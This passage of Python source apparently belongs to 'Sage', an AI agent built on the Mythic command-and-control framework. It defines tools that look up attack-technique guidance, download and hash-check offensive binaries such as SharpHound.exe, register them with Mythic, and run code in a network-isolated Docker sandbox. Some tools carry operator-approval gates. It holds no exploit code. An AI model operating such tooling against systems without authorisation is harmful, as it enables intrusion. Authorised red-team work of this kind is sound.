        tier of the progressive-disclosure pattern.

        Args:
            slug: The TTP slug returned by get_ttp_guidance.
        Returns:
            str: JSON with the full reference text, or a not_found / no_full_reference status.
        """
        # HITL: free
        logger.debug(f"🛠️ Calling get_ttp_full_reference tool (slug={slug!r})")
        frontmatter, body = ttp_library.load_ttp(slug)
        if body is None:
            available = [s for s, _, _ in ttp_library.iter_ttps()]
            return json.dumps({"status": "not_found", "slug": slug, "available_ttps": available}, sort_keys=True)
        reference = ttp_library.full_reference(body)
        if not reference:
            return json.dumps({
                "status": "no_full_reference",
                "slug": slug,
                "note": "This TTP has no Full Reference yet; rely on common_args and usage_examples from get_ttp_guidance.",
            }, sort_keys=True)
        return json.dumps({"slug": slug, "full_reference": reference}, sort_keys=True)

    async def list_ttp_categories(self) -> str:
        """List Sage's TTP knowledge library grouped by category.

        Use this to discover what tradecraft Sage has structured guidance for before forming a
        plan. Each category lists the tools (slug + name) available under it.

        Returns:
            str: JSON mapping each category to a list of {slug, name}, or an empty status.
        """
        # HITL: free
        logger.debug("🛠️ Calling list_ttp_categories tool")
        categories = ttp_library.list_categories()
        if not categories:
            return json.dumps({
                "status": "empty",
                "note": "No TTP files present yet at Payload_Type/sage/ttps/.",
            }, sort_keys=True)
        return json.dumps(categories, sort_keys=True)

    async def _find_uploaded_file_by_hash(self, md5: str, sha1: str) -> dict | None:
        """Find a non-deleted, operator-uploaded (NOT download-from-agent) Mythic file whose md5 AND sha1
        matches. Content-based dedup: an unchanged binary keeps the same hash even if re-dropped under the
        SAME name, so we reuse the existing registration instead of uploading a duplicate. A recompiled
        binary has a new hash and still uploads. Mythic tracks md5/sha1 on `filemeta`."""
        # Require BOTH md5 AND sha1 to match (not OR — a single-hash match widens the collision/poison
        # surface, Forge 2026-06-12), and require the file to be COMPLETE (a partial/interrupted upload
        # carries the hash but its bytes aren't fully on the server — reusing it breaks a later execute) and
        # NOT a payload (is_payload) or agent-download.
        if self.client is None or not (md5 and sha1):
            return None
        query = (
            "query FileByHash($md5: String!, $sha1: String!) { "
            "filemeta(where: { deleted: {_eq: false}, complete: {_eq: true}, is_payload: {_eq: false}, "
            "is_download_from_agent: {_eq: false}, md5: {_eq: $md5}, sha1: {_eq: $sha1} }, "
            "order_by: {id: desc}, limit: 1) { agent_file_id filename_utf8 md5 sha1 } }"
        )
        try:
            resp = await mythic.execute_custom_query(self.client, query, variables={"md5": md5, "sha1": sha1})
            rows = resp.get("filemeta") if isinstance(resp, dict) else None
            return rows[0] if rows else None
        except Exception as e:
            logger.debug(f"file-by-hash lookup failed: {e}")
            return None

    async def _find_uploaded_file_by_name(self, filename: str) -> dict | None:
        """Find the latest non-deleted operator-uploaded Mythic file by filename, including hash fields."""
        if self.client is None or not filename:
            return None
        try:
            row = await mythic.get_latest_uploaded_file_by_name(
                self.client,
                filename=filename,
                custom_return_attributes="id agent_file_id filename_utf8 md5 sha1 complete",
            )
            return row if row else None
        except Exception as e:
            logger.debug(f"get_latest_uploaded_file_by_name failed for {filename}: {e}")
            return None

    async def _post_registered_file_webhook(self, path: str, filename: str, content: bytes) -> tuple[int, str]:
        """POST one file-registration attempt and return the raw HTTP status/body.

        Mythic v4 serves this webhook at the root path. Older scripting clients still hardcode the
        legacy `/api/v1.4/` prefix, so Sage owns the tiny HTTP seam instead of inheriting that stale route.
        """
        if self.client is None:
            raise Exception("MythicAPIClient not initialized. Call login() first.")
        form = aiohttp.FormData()
        form.add_field("file", value=content, filename=filename)
        token = getattr(self.client, "apitoken", None) or getattr(self.client, "access_token", None)
        headers = {"Authorization": f"Bearer {token}"} if token else {}
        url = f"{self.client.http}{self.client.server_ip}:{self.client.server_port}{path}"
        async with aiohttp.ClientSession() as session:
            async with session.post(url, data=form, headers=headers, ssl=False) as response:
                return response.status, await response.text()

    async def _register_file(self, filename: str, content: bytes) -> str:
        """Register a file against the live Mythic webhook, with a legacy route fallback.

        Mythic v4's UI and server use `/task_upload_file_webhook`; the Python SDK version pinned by this
        repo still posts to `/api/v1.4/task_upload_file_webhook`. Try the live v4 route first and retain the
        legacy path only for older Mythic deployments.
        """
        route_errors: list[str] = []
        for path in ("/task_upload_file_webhook", "/api/v1.4/task_upload_file_webhook"):
            try:
                status, body = await self._post_registered_file_webhook(path, filename, content)
            except Exception as exc:
                route_errors.append(f"{path}: {type(exc).__name__}: {exc}")
                continue
            if status in {404, 405}:
                route_errors.append(f"{path}: HTTP {status}")
                continue
            try:
                response = json.loads(body)
            except Exception:
                preview = " ".join(str(body or "").split())[:200] or "<empty response>"
                raise RuntimeError(
                    f"Mythic file upload {path} returned HTTP {status} with a non-JSON response: {preview}"
                )
            if status >= 400:
                error = response.get("message") or response.get("error") or response
                raise RuntimeError(f"Mythic file upload {path} returned HTTP {status}: {error}")
            if response.get("status") == "success" and response.get("agent_file_id"):
                return str(response["agent_file_id"])
            error = response.get("error") or response
            raise RuntimeError(f"Mythic file upload {path} failed: {error}")
        raise RuntimeError(
            "Mythic file upload endpoint was not found; tried "
            + ", ".join(route_errors or ["/task_upload_file_webhook", "/api/v1.4/task_upload_file_webhook"])
        )

    async def _register_file_dedup(self, filename: str, content: bytes) -> tuple[str, bool]:
        """Register a file with Mythic, but reuse an existing upload only when exact content AND filename match.

        Apollo's by-name commands resolve `assembly_name` through Mythic filemeta by filename. Reusing an
        identical hash under a different filename would return a valid UUID but leave `execute_assembly
        <filename>` resolving to an older row or no row, so same-content/different-name still uploads under the
        requested filename.
        """
        md5 = hashlib.md5(content).hexdigest()
        sha1 = hashlib.sha1(content).hexdigest()
        existing = await self._find_uploaded_file_by_hash(md5, sha1)
        existing_name = str((existing or {}).get("filename_utf8") or "")
        if existing and existing.get("agent_file_id") and existing_name.casefold() == str(filename or "").casefold():
            logger.info(
                f"🔁 [upload-dedup] {filename}: identical md5/sha1 already in Mythic "
                f"(uuid={existing['agent_file_id']}, name={existing.get('filename_utf8')!r}) — reusing, not re-uploading."
            )
            return existing["agent_file_id"], True
        if existing and existing.get("agent_file_id"):
            logger.info(
                f"🔁 [upload-dedup] {filename}: identical md5/sha1 exists as {existing_name!r}, "
                "but by-name tasking needs the requested filename — uploading a new filemeta row."
            )
        file_uuid = await self._register_file(filename, content)
        return file_uuid, False

    async def ensure_tool_uploaded(
        self,
        binary_filename: Annotated[str, "The tool binary filename, e.g. 'SharpHound.exe' (matches a TTP's binary_filename)."],
    ) -> str:
        """Ensure a tool binary is in Mythic's file store, uploading it from the tools/ drop zone if missing; returns the Mythic file UUID to pass as a later File parameter.

        Caveat: call this and retry when a by-name assembly call fails with "0 files were found" /
        "file not found by name" — the file is just unregistered, not unavailable.
        """
        # HITL: free
        if self.client is None:
            raise Exception("MythicAPIClient not initialized. Call login() first.")
        logger.debug(f"🛠️ Calling ensure_tool_uploaded tool (binary={binary_filename!r})")
        local_path = ttp_library.TOOLS_DIR / binary_filename
        local_content: bytes | None = None
        local_md5 = ""
        local_sha1 = ""
        if local_path.is_file():
            try:
                local_content = local_path.read_bytes()
                local_md5 = hashlib.md5(local_content).hexdigest()
                local_sha1 = hashlib.sha1(local_content).hexdigest()
            except Exception as e:
                return json.dumps({"status": "error", "binary_filename": binary_filename, "error": str(e)}, sort_keys=True)

        # 1. Already in Mythic's file store? If local bytes exist, same-name reuse requires same md5+sha1.
        existing = await self._find_uploaded_file_by_name(binary_filename)
        if existing:
            uuid = existing.get("agent_file_id") or existing.get("id")
            existing_md5 = str(existing.get("md5") or "")
            existing_sha1 = str(existing.get("sha1") or "")
            if uuid and local_content is None:
                return json.dumps({
                    "status": "already_present",
                    "binary_filename": binary_filename,
                    "file_uuid": uuid,
                    "hash_check": "skipped_no_local_copy",
                }, sort_keys=True)
            if uuid and local_md5 and local_sha1 and existing_md5 == local_md5 and existing_sha1 == local_sha1:
                return json.dumps({
                    "status": "already_present",
                    "binary_filename": binary_filename,
                    "file_uuid": uuid,
                    "dedup": "name_hash",
                }, sort_keys=True)
            if uuid and (not existing_md5 or not existing_sha1):
                return json.dumps({
                    "status": "already_present",
                    "binary_filename": binary_filename,
                    "file_uuid": uuid,
                    "hash_check": "unavailable",
                }, sort_keys=True)

        # 2. Operator drop zone
        if not local_path.is_file():
            return json.dumps({
                "status": "missing",
                "binary_filename": binary_filename,
                "note": f"Not in Mythic's file store and not found at tools/{binary_filename}. "
                        f"Operator must drop the binary into Payload_Type/sage/tools/ or upload it to Mythic first. "
                        f"If this tool's TTP has a pinned binary_download block, you may call "
                        f"download_tool(binary_filename) FIRST (with operator approval) to fetch it into tools/, "
                        f"then call ensure_tool_uploaded again.",
            }, sort_keys=True)
        # 3. Content-dedup then register: reuse an existing Mythic file with the SAME md5/sha1 (refuse a
        #    duplicate upload of an unchanged binary); only a changed/recompiled binary actually uploads.
        try:
            file_uuid, reused = await self._register_file_dedup(binary_filename, local_content or local_path.read_bytes())
            response = {
                "status": "already_present" if reused else "uploaded",
                "binary_filename": binary_filename,
                "file_uuid": file_uuid,
                "dedup": "hash" if reused else "none",
            }
            if existing:
                response["reason"] = "same_name_hash_changed"
                response["superseded_file_uuid"] = existing.get("agent_file_id") or existing.get("id")
            return json.dumps({
                **response,
            }, sort_keys=True)
        except Exception as e:
            return json.dumps({"status": "error", "binary_filename": binary_filename, "error": str(e)}, sort_keys=True)

    async def download_tool(
        self,
        binary_filename: Annotated[str, "The tool binary filename to fetch from its pinned TTP source, e.g. 'SharpHound.exe' (matches a TTP's binary_filename)."],
    ) -> str:
        """Download a tool binary from its pinned, sha256-verified TTP source into the tools/ drop zone (does NOT upload to Mythic — call ensure_tool_uploaded afterward).

        Caveat: REQUIRES prior explicit operator approval — it fetches a binary from the internet; ask
        and receive approval before calling.
        """
        # HITL: guarded
        import hashlib, io, zipfile
        logger.debug(f"🛠️ Calling download_tool tool (binary={binary_filename!r})")
        # 1. Find the TTP carrying this binary_filename. Multiple TTPs may share the same
        #    binary_filename; prefer the one that actually pins a binary_download block.
        meta = None
        matched_any = False
        for _slug, frontmatter, _body in ttp_library.iter_ttps():
            if frontmatter.get("binary_filename") == binary_filename:
                matched_any = True
                if isinstance(frontmatter.get("binary_download"), dict):
                    meta = frontmatter
                    break
        if meta is None:
            if matched_any:
                return json.dumps({"status": "no_download_metadata", "binary_filename": binary_filename,
                                   "note": "A TTP declares this binary but none pins a binary_download block."}, sort_keys=True)
            return json.dumps({"status": "no_ttp", "binary_filename": binary_filename,
                               "note": "No TTP declares this binary_filename."}, sort_keys=True)
        # 2. Pinned download block (guaranteed a dict by the selection above)
        dl = meta["binary_download"]
        url = dl.get("url")
        archive_sha256 = dl.get("archive_sha256")
        extract_member = dl.get("extract_member")
        archive = dl.get("archive")
        if not url or not archive_sha256:
            return json.dumps({"status": "invalid_download_metadata", "binary_filename": binary_filename,
                               "note": "binary_download requires both url and archive_sha256."}, sort_keys=True)
        target = ttp_library.TOOLS_DIR / binary_filename
        # 3. Idempotent: already in the drop zone
        if target.is_file():
            return json.dumps({"status": "already_present", "binary_filename": binary_filename,
                               "path": str(target)}, sort_keys=True)
        # 4. Download (blocking -> offload to a thread)
        def _fetch(u):
            import requests
            r = requests.get(u, timeout=120)
            r.raise_for_status()
            return r.content
        try:
            content = await asyncio.to_thread(_fetch, url)
        except Exception as e:
            return json.dumps({"status": "download_failed", "binary_filename": binary_filename,
                               "url": url, "error": str(e)}, sort_keys=True)
        # 5. Verify sha256 BEFORE writing anything to disk (tamper-evidence)
        actual = hashlib.sha256(content).hexdigest()
        if actual.lower() != str(archive_sha256).lower():
            return json.dumps({"status": "hash_mismatch", "binary_filename": binary_filename,
                               "expected": archive_sha256, "actual": actual}, sort_keys=True)
        # 6. Extract/write into the drop zone
        try:
            ttp_library.TOOLS_DIR.mkdir(parents=True, exist_ok=True)
            is_zip = (archive == "zip") or str(url).lower().endswith(".zip")
            if is_zip:
                if not extract_member:
                    return json.dumps({"status": "invalid_download_metadata", "binary_filename": binary_filename,
                                       "note": "archive is zip but extract_member is missing."}, sort_keys=True)
                with zipfile.ZipFile(io.BytesIO(content)) as z:
                    names = z.namelist()
                    if extract_member not in names:
                        return json.dumps({"status": "member_not_found", "binary_filename": binary_filename,
                                           "extract_member": extract_member, "available": names}, sort_keys=True)
                    data = z.read(extract_member)
                # Security: ignore any path components in the member name (zip-traversal guard);
                # write only to TOOLS_DIR/<basename>.
                target = ttp_library.TOOLS_DIR / os.path.basename(extract_member)
                target.write_bytes(data)
            else:
                target.write_bytes(content)
            return json.dumps({"status": "downloaded", "binary_filename": binary_filename,
                               "path": str(target), "version": dl.get("version"),
                               "sha256_verified": True}, sort_keys=True)
        except Exception as e:
            return json.dumps({"status": "error", "binary_filename": binary_filename, "error": str(e)}, sort_keys=True)

    def _run_sandbox_sync(self, command: list[str], image: str, timeout: int,
                          mem_limit: str, pids_limit: int, work_size: str) -> dict:
        """Blocking sandbox run (offloaded via asyncio.to_thread). Returns a result dict.

        All isolation is applied here at create time: no privileges, all caps dropped,
        no-new-privileges, read-only rootfs, size-capped tmpfs work dir, network disabled,
        mem/pids caps, non-root user, hard timeout + force-remove. See Plans/SANDBOX_DESIGN.md.
        """
        import docker
        from docker.errors import ImageNotFound

        client = docker.from_env()
        # Ensure the sandbox image exists; build from container/sandbox/ on first use.
        try:
            client.images.get(image)
        except ImageNotFound:
            # __file__ = .../sage/ai/langgraph/mythic_tools.py -> up 3 dirs = .../sage/
            sage_root = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
            sandbox_ctx = os.path.join(sage_root, "container", "sandbox")
            logger.info(f"Building sandbox image '{image}' from {sandbox_ctx} (first use)")
            client.images.build(path=sandbox_ctx, tag=image, rm=True)

        container = client.containers.run(
            image=image,
            command=command,
            detach=True,
            network_disabled=True,
            read_only=True,
            tmpfs={"/sandbox/work": f"size={work_size},uid=10001"},
            working_dir="/sandbox/work",
            user="10001",
            mem_limit=mem_limit,
            pids_limit=pids_limit,
            cap_drop=["ALL"],
            security_opt=["no-new-privileges"],
            auto_remove=False,
        )
        timed_out = False
        exit_code = -1
        try:
            try:
                result = container.wait(timeout=timeout)
                exit_code = result.get("StatusCode", -1)
            except Exception:
                # docker-py raises on wait timeout (ReadTimeout/ConnectionError) -> kill it
                timed_out = True
                try:
                    container.kill()
                except Exception:
                    pass
            stdout = container.logs(stdout=True, stderr=False).decode("utf-8", "replace")
            stderr = container.logs(stdout=False, stderr=True).decode("utf-8", "replace")
        finally:
            try:
                container.remove(force=True)  # ephemeral — never leave it behind
            except Exception:
                pass

        cap = 20000  # truncate large output before it reaches the LLM
        return {
            "exit_code": exit_code,
            "timed_out": timed_out,
            "stdout": stdout[:cap],
            "stderr": stderr[:cap],
            "truncated": len(stdout) > cap or len(stderr) > cap,
        }

    async def sandbox_exec(
        self,
        code_or_command: Annotated[str, "The code or shell command to run in the isolated sandbox."],
        language: Annotated[str, "'shell' (sh -c) or 'python' (python3 -c). Default 'shell'."] = "shell",
        timeout: Annotated[int | None, "Wall-clock timeout in seconds; default 30, clamped to 1-120."] = None,
    ) -> str:
        """Run untrusted code in an isolated, ephemeral sandbox container, returning stdout/stderr/exit.

        The code runs in a throwaway `sage-sandbox` container with NO access to the Sage container's
        filesystem (Mythic tokens, sage.db, TTP files), NO host mounts, NO network, dropped capabilities,
        a read-only rootfs + small tmpfs work dir, memory/pid caps, a non-root user, and a hard timeout.
        Use this for ad-hoc parsing/scripting that should NOT run in the Sage container or on the host.

        # HITL: guarded  (code execution — supervised mode must gate this; Phase 2 reads this tag)

        Args:
            code_or_command: The code/command to execute.
            language: 'shell' or 'python'.
            timeout: Seconds (default 30, max 120).
        Returns:
            str: JSON {status, exit_code, stdout, stderr, timed_out, truncated} or {status:error,...}.
        """
        try:
            import docker  # noqa: F401  (lazy: module must import even when the SDK is absent)
        except ImportError:
            return json.dumps({"status": "error", "error": "docker SDK not installed in the Sage container; add 'docker' to requirements and rebuild."}, sort_keys=True)

        timeout = 30 if timeout is None else max(1, min(int(timeout), 120))
        if language == "python":
            command = ["python3", "-c", code_or_command]
        elif language == "shell":
            command = ["sh", "-c", code_or_command]
        else:
            return json.dumps({"status": "error", "error": f"unsupported language '{language}'; use 'shell' or 'python'."}, sort_keys=True)

        logger.debug(f"🛠️ Calling sandbox_exec (language={language}, timeout={timeout}s)")
        try:
            result = await asyncio.to_thread(
                self._run_sandbox_sync, command, "sage-sandbox:latest", timeout, "512m", 256, "128m"
            )
            result["status"] = "ok"
            return json.dumps(result, sort_keys=True)
        except Exception as e:
            return json.dumps({"status": "error", "error": f"sandbox execution failed: {e}"}, sort_keys=True)

# Create a main function with arguments so that I can test the methods in this class manually
if __name__ == "__main__":
    import argparse
    import asyncio

    parser = argparse.ArgumentParser(description="Test MythicTools class methods.")
    parser.add_argument("agent_task_id", type=str, help="The Mythic agent task ID to initialize the client.")
    parser.add_argument("method", type=str, help="The method to test (e.g., get_payload_names, get_all_active_callbacks).")
    args = parser.parse_args()

    async def main():
        if "RABBITMQ_PASSWORD" not in os.environ or "RABBITMQ_HOST" not in os.environ:
            print("Error: RABBITMQ_PASSWORD and RABBITMQ_HOST environment variables must be set.")
            return
        mythic_tools = MythicTools(agent_task_id=args.agent_task_id)
        await mythic_tools.login()
        method = getattr(mythic_tools, args.method, None)
        if method and asyncio.iscoroutinefunction(method):
            result = await method()
            print(f"Result from {args.method}:\n{result}")
        else:
            print(f"Method {args.method} not found or is not asynchronous.")

    asyncio.run(main())
